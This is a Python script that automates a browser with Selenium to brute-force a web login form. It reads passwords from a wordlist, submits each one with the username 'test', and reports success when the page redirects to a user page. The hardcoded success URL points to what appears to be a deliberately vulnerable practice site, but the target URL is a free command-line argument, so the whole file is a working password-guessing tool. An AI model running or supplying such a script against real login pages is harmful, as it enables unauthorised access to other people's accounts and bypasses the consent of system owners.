import argparse
from selenium import webdriver
from selenium.webdriver.common.by import By
from selenium.webdriver.chrome.service import Service
from selenium.common.exceptions import StaleElementReferenceException
from webdriver_manager.chrome import ChromeDriverManager
import time

# Function to open the browser, input credentials, and submit the form
def login_with_test_credentials(target_url, passwords):
    # Set up Chrome WebDriver using WebDriver Manager
    driver = webdriver.Chrome(service=Service(ChromeDriverManager().install()))

    # Open the browser and navigate to the login page
    driver.get(target_url)  # Use the provided target URL

    # Allow the page to load for a few seconds
    time.sleep(3)
    
    for password in passwords:
        try:
            # Re-locate the username and password fields after each iteration
            username_field = driver.find_element(By.NAME, "uname")
            password_field = driver.find_element(By.NAME, "pass")

            # Input the username 'test' and try the password
            username_field.clear()
            username_field.send_keys("test")  # Enter username
            
            password_field.clear()
            password_field.send_keys(password)  # Enter the current password

            # Click the submit button
            login_button = driver.find_element(By.CSS_SELECTOR, "input[type='submit'][value='login']")
            login_button.click()

            # Wait for some time to allow page navigation
            time.sleep(5)

            # Check if login was successful by verifying the URL
            if driver.current_url == "http://testphp.vulnweb.com/userinfo.php":  # Successful login redirect URL
                print(f"Password found: {password}")
                break
            else:
                print(f"Password incorrect: {password}")

            # Optional: Return to login page for next password attempt if needed
            driver.get(target_url)  # Return to login page for next attempt
            time.sleep(3)

        except StaleElementReferenceException:
            # Handle case where the element becomes stale
            print("Stale element encountered, trying again.")
            time.sleep(2)  # Optionally wait before retrying

    # Close the browser after all attempts
    driver.quit()

# Function to read passwords from a file
def read_passwords_from_file(file_path):
    with open(file_path, 'r') as file:
        return [line.strip() for line in file]

if __name__ == '__main__':
    # Set up argument parsing
    parser = argparse.ArgumentParser(description="Login script with password brute force.")
    parser.add_argument("url", help="Target login URL")
    parser.add_argument("wordlist", help="Path to the wordlist file")
    
    # Parse arguments from the command line
    args = parser.parse_args()

    # Read the passwords from the provided wordlist file
    passwords = read_passwords_from_file(args.wordlist)
    
    # Call the login function with the provided URL and passwords
    login_with_test_credentials(args.url, passwords)

